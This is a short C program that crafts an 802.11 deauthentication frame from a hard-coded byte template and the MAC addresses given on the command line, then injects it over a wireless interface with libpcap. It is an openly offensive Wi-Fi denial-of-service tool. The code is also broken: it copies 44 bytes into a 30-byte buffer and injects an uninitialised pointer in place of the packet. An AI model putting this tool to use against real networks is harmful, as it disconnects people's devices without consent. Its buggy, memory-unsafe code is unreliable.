#include "pktTypeStructs.h"
#include "hacking.h"
#include <pcap.h>
#define DEAUTH_REQ      \
    "\x00\x00\x12\x00\x2E\x48\x00\x00\x00\x02\x6C\x09\xA0\x00\xBF\x01\x00\x00\xC0\x00\x3A\x01\xCC\xCC\xCC\xCC\xCC\xCC\xBB\xBB\xBB\xBB\xBB\xBB" \
"\xBB\xBB\xBB\xBB\xBB\xBB\x00\x00\x07\x00"
struct opt {
  unsigned char bssid[6];
  unsigned char src_addr[6];
  unsigned char dst_addr[6];
 
};
int main(int argc, unsigned char *argv[])
{
  unsigned char buff[30];
  struct opt mac;
  struct deauth_pkt pkt;
  struct deauth *data;
  unsigned int iMac[6];
  char errbuf[PCAP_ERRBUF_SIZE];
  char *device;
  int i;
   sscanf(argv[1], "%x:%x:%x:%x:%x:%x", &iMac[0], &iMac[1], &iMac[2], &iMac[3], &iMac[4], &iMac[5]);
  for(i=0;i<6;i++)
    {
      mac.bssid[i] = (unsigned char)iMac[i];
    }
   sscanf(argv[2], "%x:%x:%x:%x:%x:%x", &iMac[0], &iMac[1], &iMac[2], &iMac[3], &iMac[4], &iMac[5]);
  for(i=0;i<6;i++)
    {
      mac.src_addr[i] = (unsigned char)iMac[i];
    }
  device = argv[3];
  memcpy(buff, DEAUTH_REQ, 44);
  memcpy(buff + 28, mac.bssid, 6);
  memcpy(buff + 34, mac.bssid, 6);
  memcpy(buff + 22, mac.src_addr, 6);
  memcpy((void *) &pkt, buff, 44);
  dump((const unsigned char *) &pkt, 44);/*DEBUGGING*/
  pcap_t* pcap = pcap_open_live(device,96,0,0,errbuf);
  pcap_inject(pcap, &data, 44);
    
}
